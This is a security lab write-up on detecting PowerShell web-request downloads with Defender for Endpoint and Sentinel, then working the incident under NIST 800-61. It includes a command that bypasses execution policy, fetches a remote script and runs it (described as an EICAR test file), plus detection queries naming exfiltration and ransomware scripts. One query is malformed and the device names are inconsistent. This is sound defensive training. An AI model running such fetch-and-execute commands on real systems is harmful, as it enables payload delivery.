# 🧪 Threat Detection & Incident Response Lab: PowerShell Suspicious Web Request

This lab walks through the lifecycle of a detection and response scenario where PowerShell is used to download scripts from a remote server using `Invoke-WebRequest`. The goal is to detect, investigate, and respond using Microsoft Defender for Endpoint (MDE), Microsoft Sentinel, and the NIST 800-61 Incident Response framework.

---

## 🌟 Objective

* Detect suspicious PowerShell use for remote file downloads
* Simulate the activity on an MDE-onboarded host
* Configure a detection rule in Microsoft Sentinel
* Investigate alerts and associated artifacts
* Perform containment, remediation, and reporting actions

---

## 🧰 Preparation

Attackers commonly use legitimate tools like PowerShell to evade detection, leveraging commands such as `Invoke-WebRequest` to download payloads. This technique is part of **LOLBins** (Living Off the Land Binaries). In this lab, we simulate such behavior by downloading `eicar.ps1` (a harmless test file).

Defender for Endpoint detects the behavior and sends telemetry to Microsoft Sentinel for detection and response.

---

## 🛡️ Create Alert Rule: Suspicious PowerShell Web Request

### 🔍 Detection Context

`Invoke-WebRequest` is frequently abused by attackers to:

* Download malicious files or scripts
* Execute payloads post-compromise
* Communicate with external infrastructure (C2)

### 📊 Detection Pipeline

1. **MDE logs** PowerShell activity in `DeviceProcessEvents`
2. Logs are **forwarded to Sentinel** via Log Analytics
3. A **scheduled alert rule** in Sentinel detects the behavior

---

### 🔧 Step-by-Step Detection Setup

#### 1️⃣ Query Defender Logs

Run the following in Log Analytics Workspace to locate `Invoke-WebRequest` usage:

```kql
let TargetDevice = "nessa-windows";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
```

Verify payload detection. ✅

```kql
let TargetHostname = "nessa-windows";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

![Defender Screenshot](https://github.com/user-attachments/assets/49202b3e-736c-411e-8a46-67f60c431387)

#### 2️⃣ Create Alert Rule in Sentinel

1. Go to **Microsoft Sentinel > Analytics > Create > Scheduled Query Rule**
2. Fill in:

   * **Name**: PowerShell Suspicious Web Request
   * **Description**: Detects PowerShell downloading remote files
   * **KQL**:

```kql
let TargetDevice = "nessa-windows";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
```

3. **Frequency**: Every 4 hours
   **Lookup Period**: Last 24 hours
4. **Entity Mapping**:

   * `AccountName`, `DeviceName`, `ProcessCommandLine`
5. **MITRE Tactic**: Command and Scripting Interpreter: PowerShell / Execution
6. **Enable** and save the rule

![Sentinel Screenshot](https://github.com/user-attachments/assets/2c2e0d75-aa67-4ffc-a5ed-ffe30393d388)

---

### 💣 Simulate Attack — Triggering the Alert

In order to generate log activity that will trigger an Incident in Sentinel, I executed the following PowerShell command on the onboarded VM (`nessa-windows`) to simulate the attack:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```
---

### 🕵️ Rule Triggered - Triage the Incident

The simulated malicious PS script successfully triggered the Sentinel Analytics rule, the alert appears in Microsoft Sentinel under **Incidents**. I began the investigation:

1. I Assigned the incident to myself and marked it Active.  
2. I then reviewed the incident details to identify affected devices, users, and commands.

![Incident Overview](images/map5.png)

<br>

### 🔎 Event details on Microsoft Sentinel incident page:

**![Simulated Execution](images/IR_IMG4.png)**

**Simulated User Behavior**:  
Upon contacting the (simulated) user, they report attempting to install free software, possibly triggering the download of the script.

**Entity Mapping Observed**:
- PowerShell Suspicious Web Request was triggered on **1 device** by **1 user**.  
- The PowerShell command downloaded the following script:  
  - URL: https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1

---

### 🧪 Confirm Script Execution

To confirm whether the downloaded script was executed, run this query:

```kusto
DeviceProcessEvents
let TargetHostname = "pvr-hunting2";
let ScriptNames = dynamic(["eicar.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| order by TimeGenerated
```

![Execution Confirmation](images/DidItRun6.png)

✅ The logs confirm that `eicar.ps1` was executed. 

---











## 🛠️ Work the Incident (NIST 800-61 Lifecycle)

### 1️⃣ Preparation

* Confirm access, tooling, training

### 2️⃣ Detection & Analysis

* Assign incident and mark Active
* Investigate:

```plaintext
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri <URL> -OutFile <Path>
```

* Identify scripts:

  * `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1`
* Gather evidence and validate intent (user or threat)

### 3️⃣ Containment & Recovery

* Isolate host using MDE
* Run Defender scans
* Remove malicious files, validate host state

### 4️⃣ Post-Incident

* Log scripts executed
* Note involved user (`system-user`)
* Update PowerShell usage policy
* Enhance training
* Mark incident **True Positive** and close

---

## 📍 Incident Summary

| **Metric**          | **Value**                                                         |
| ------------------- | ----------------------------------------------------------------- |
| Affected Device     | `windows-target-1`                                                |
| Suspicious Commands | 4                                                                 |
| Scripts Downloaded  | `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1` |
| Incident Status     | Resolved                                                          |

---

🎉 **Well done on completing the lab and securing your endpoint!** 🔐
